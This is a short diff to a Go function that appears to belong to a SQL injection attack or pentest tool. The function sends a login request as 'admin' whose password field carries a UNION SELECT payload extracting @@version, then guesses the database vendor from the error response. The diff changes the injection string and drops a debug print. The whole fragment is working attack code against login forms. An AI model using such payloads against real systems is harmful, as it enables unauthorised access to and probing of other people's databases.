@@ -63,11 +63,10 @@ func check_sqli() bool {
 func get_version() string {
 	data := url.Values {
 		"username":		{"admin"},
-		"password":		{"test'OR'1'='1' UNION SELECT 1,2,@@version;-- "},
+		"password":		{"test' UNION SELECT 1,2,@@version;-- "},
 	};
 	code, body := get_response(data);
 	if (code == 500 || (strings.Contains(body, "Fatal"))) {
-		fmt.Println(body);
 		return "Oracle";
 	}
 	return "Microsoft";
